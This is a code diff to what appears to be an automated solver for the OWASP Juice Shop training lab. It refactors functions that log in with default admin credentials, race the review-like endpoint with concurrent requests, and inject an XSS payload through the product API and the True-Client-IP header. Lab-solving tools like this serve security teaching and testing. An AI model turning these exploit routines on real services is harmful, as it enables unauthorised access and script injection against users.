@@ -285,10 +285,7 @@ def _forged_coupon(c):
 def _multiple_likes(c):
     """Multiple Likes — race the like endpoint (concurrent POSTs) so the check-then-push isn't
     atomic and the same email lands in a review's likedBy more than twice."""
-    import json as _j
     import threading
-    import urllib.request as _u
-    base = str(c.base_url).rstrip("/")
     a = _login(c, "admin@juice-sh.op", "admin123")
     tok = a.get("token")
     if not tok:
@@ -301,8 +298,9 @@ def _multiple_likes(c):
 
         def _like():
             try:
-                _u.urlopen(_u.Request(base + "/rest/products/reviews", data=_j.dumps({"id": rid}).encode(),
-                           headers={"Content-Type": "application/json", "Authorization": "Bearer " + tok}), timeout=8)
+                c.post("/rest/products/reviews", json={"id": rid},
+                       headers={"Content-Type": "application/json", "Authorization": "Bearer " + tok},
+                       timeout=8)
             except Exception:
                 pass
         ts = [threading.Thread(target=_like) for _ in range(10)]
@@ -351,9 +349,9 @@ def _api_and_header_xss(c):
     try:
         c.post("/api/Products", headers={"Authorization": "Bearer " + tok},
                json={"name": "xssp", "description": _IFRAME, "price": 1, "image": "x.jpg"})   # API-only XSS
-        import urllib.request as _u
-        _u.urlopen(_u.Request(str(c.base_url).rstrip("/") + "/rest/saveLoginIp",
-                   headers={"Authorization": "Bearer " + tok, "True-Client-IP": _IFRAME}), timeout=8)  # HTTP-Header XSS
+        c.get("/rest/saveLoginIp",
+              headers={"Authorization": "Bearer " + tok, "True-Client-IP": _IFRAME},
+              timeout=8)  # HTTP-Header XSS
     except Exception:
         pass
 
@@ -819,12 +817,14 @@ def solve(base_url: str) -> dict:
     """Run the full Juice Shop lab solver against a live instance; report scoreboard delta."""
     try:
         import httpx
+        import browser_engine
     except Exception:
         return {"error": "httpx unavailable"}
     base = base_url.rstrip("/")
     try:
-        c = httpx.Client(base_url=base, follow_redirects=False, timeout=20,
-                         headers={"User-Agent": "apolaki-labmode"})
+        c = browser_engine.rate_limited_sync_client(
+            httpx, base_url=base, follow_redirects=False, timeout=20,
+            headers={"User-Agent": "apolaki-labmode"})
     except Exception as e:
         return {"error": str(e)}
     try:
@@ -1142,11 +1142,13 @@ def conquest(base_url: str) -> dict:
     can show every solved challenge and the technique behind it. Performs NO exploitation."""
     try:
         import httpx
+        import browser_engine
     except Exception:
         return {"error": "httpx unavailable"}
     base = base_url.rstrip("/")
     try:
-        c = httpx.Client(base_url=base, timeout=15, headers={"User-Agent": "apolaki-labmode"})
+        c = browser_engine.rate_limited_sync_client(
+            httpx, base_url=base, timeout=15, headers={"User-Agent": "apolaki-labmode"})
     except Exception as e:
         return {"error": str(e)}
     try:
